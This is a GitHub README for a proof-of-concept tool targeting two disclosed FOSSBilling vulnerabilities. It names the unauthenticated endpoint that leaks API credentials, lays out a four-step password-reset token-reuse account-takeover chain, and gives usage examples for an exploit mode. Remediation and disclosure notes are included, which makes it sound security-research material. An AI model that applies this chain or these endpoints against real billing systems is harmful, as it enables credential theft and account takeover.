# FOSKiller

```
 ███████╗ ██████╗ ███████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 █████╗  ██║   ██║███████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ██╔══╝  ██║   ██║╚════██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ██║     ╚██████╔╝███████║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝

  made by 7megaumka7  |  FOSSBilling CVE-2026-53647 & CVE-2026-53646 PoC
```

Proof-of-concept tool for two accepted GitHub Security Advisory vulnerabilities
affecting [FOSSBilling](https://fossbilling.org/) versions up to **0.7.2**.

| Advisory | CVE | Type | CVSS |
|---|---|---|---|
| [GHSA-737q-9gpr-6mpq](https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-737q-9gpr-6mpq) | CVE-2026-53647 | Unauthenticated API Key Config Disclosure | **6.9 Moderate** |
| [GHSA-vp66-w6rc-x32p](https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-vp66-w6rc-x32p) | CVE-2026-53646 | Password Reset Token Reuse → Account Takeover | **7.7 High** |

---

## Vulnerabilities

### CVE-2026-53647 — Unauthenticated API Key Configuration Disclosure

**Affected:** FOSSBilling >= 0.5.3, <= 0.7.2

The guest endpoint `/api/guest/serviceapikey/get_info` accepts a key parameter and
returns the full service configuration — including all `custom_*` fields — without
requiring any authentication. This can expose API credentials, hostnames, passwords,
and other sensitive configuration values to an unauthenticated attacker.

**Attack scenario:** An attacker who knows or enumerates a valid API key string can
retrieve the complete service backend configuration from a publicly accessible endpoint.

---

### CVE-2026-53646 — Password Reset Token Reuse / Persistent Account Takeover

**Affected:** FOSSBilling >= 0.5.6, <= 0.7.2

When a client password reset is requested twice for the same account, the application
issues a new token but **does not invalidate the previous token**. An attacker who
intercepted the first token retains a valid credential to set a new password even after
the legitimate user completes their own reset flow using the newer token.

**Attack chain:**
1. Attacker triggers `POST /api/guest/client/reset_password` for victim email → captures token **T1** (e.g. via phishing relay, network interception, or shared infrastructure).
2. Victim triggers their own password reset → application issues token **T2**.
3. Attacker calls `POST /api/guest/client/update_password?hash=T1` with an attacker-chosen password.
4. Attacker now has persistent account access regardless of the victim's reset completion.

---

## Requirements

- Python 3.8+
- `requests`
- `colorama`

---

## Installation

```bash
git clone https://github.com/7megaumka7/fossbilling-poc
cd fossbilling-poc
pip install -r requirements.txt
```

If you skip `pip install`, the script will detect missing dependencies on startup
and offer to install them automatically.

---

## Usage

```
python fossbilling_poc.py [--target URL] [--key KEY] [--email EMAIL]
                          [--check-only | --exploit]
                          [--force] [--output FILE]
                          [--timeout SEC] [--proxy URL]
```

### Flags

| Flag | Description |
|---|---|
| `--target` | Base URL of the FOSSBilling instance (**required**) |
| `--key` | API key to test for CVE-2026-53647 |
| `--email` | Client email to test for CVE-2026-53646 |
| `--check-only` | Detection mode only — confirm vulnerability, no extraction |
| `--exploit` | Full extraction + attack chain documentation |
| `--force` | Skip version range check |
| `--output FILE` | Save full results to a JSON file |
| `--timeout SEC` | HTTP timeout in seconds (default: 10) |
| `--proxy URL` | Route requests through a proxy (e.g. `http://127.0.0.1:8080`) |

`--check-only` and `--exploit` are mutually exclusive.

---

## Examples

**Detection only — both CVEs:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --email client@example.com \
  --check-only
```

**Full extraction and attack chain documentation:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --email client@example.com \
  --exploit
```

**Save results to JSON, route through Burp:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --email client@example.com \
  --output results.json \
  --proxy http://127.0.0.1:8080
```

**Force test on an unknown / out-of-range version:**
```bash
python fossbilling_poc.py \
  --target https://billing.example.com \
  --key myservicekey \
  --force
```

---

## Detection vs Exploitation Mode

| Mode | Flag | Behaviour |
|---|---|---|
| Detection | `--check-only` | Confirms the endpoint responds to unauthenticated requests and that token reuse is possible. Does not extract or display sensitive data beyond a count. |
| Exploitation | `--exploit` | Extracts and displays all leaked configuration fields; documents the full account-takeover attack chain with timing metadata. |
| Default | *(neither flag)* | Balanced — confirms status and shows evidence without aggressive extraction. |

---

## Sample Output (sanitized)

```
[*] Probing https://billing.example.com …
[+] Detected version: 0.7.1
[+] CVE-2026-53647 affected range (>=0.5.3 <=0.7.2): YES
[+] CVE-2026-53646 affected range (>=0.5.6 <=0.7.2): YES

── CVE-2026-53647 │ Unauthenticated API Key Config Disclosure ─────────
[*] Target  : https://billing.example.com/api/guest/serviceapikey/get_info?key=***
[*] Mode    : Full extraction
[*] HTTP    : 200
[+] VULNERABLE — endpoint returned 4 sensitive field(s) without authentication

  Field                          Value
  ──────────────────────────────────────────────────────────────────────
  custom_hostname                db.internal.example.com
  custom_username                fossbilling_db
  custom_password                [REDACTED]
  custom_api_secret              [REDACTED]

── CVE-2026-53646 │ Password Reset Token Reuse / Account Takeover ─────
[*] Sending reset request #1 …
[*]   HTTP 200  |  142 ms  |  2026-06-12T10:00:00.000Z
[*] Sending reset request #2 (same email) …
[*]   HTTP 200  |  138 ms  |  2026-06-12T10:00:01.000Z
[!] Both reset requests succeeded. Token not in API response — verify via email.

── Summary ─────────────────────────────────────────────────────────────
[*] FOSSBilling version detected: 0.7.1

  CVE                  GHSA                         Severity               Status
  ──────────────────────────────────────────────────────────────────────────────────
  CVE-2026-53647       GHSA-737q-9gpr-6mpq          Moderate (CVSS 6.9)    VULNERABLE
  CVE-2026-53646       GHSA-vp66-w6rc-x32p          High (CVSS 7.7)        POTENTIALLY_VULNERABLE
```

---

## Remediation

Update to **FOSSBilling >= 0.7.3** which addresses both vulnerabilities.

If immediate patching is not possible:
- **CVE-2026-53647**: Restrict access to `/api/guest/serviceapikey/` at the web server or WAF level.
- **CVE-2026-53646**: Implement token invalidation on the second reset request; add rate-limiting on the reset endpoint.

---

## Legal Disclaimer

> **This tool is provided for educational purposes and authorized security testing only.**
>
> Only use this tool against systems you own or have received **explicit written permission** to test.
> Unauthorized use against systems you do not own is illegal under the Computer Fraud and Abuse Act (CFAA),
> the Computer Misuse Act, and equivalent legislation worldwide.
>
> The author assumes **no responsibility** for misuse, damage, or legal consequences arising from
> the use of this tool. Responsible disclosure has been completed for both vulnerabilities
> through the GitHub Security Advisory program prior to publication.
>
> By using this tool you agree that you are solely responsible for your actions.

---

## Responsible Disclosure

Both vulnerabilities were responsibly disclosed to the FOSSBilling maintainers through
the GitHub Security Advisory program. Full advisory details are available at:

- https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-737q-9gpr-6mpq
- https://github.com/FOSSBilling/FOSSBilling/security/advisories/GHSA-vp66-w6rc-x32p

---

## Credits

**Researcher:** [7megaumka7](https://github.com/7megaumka7)

Discovery, analysis, responsible disclosure, and tool development by 7megaumka7.
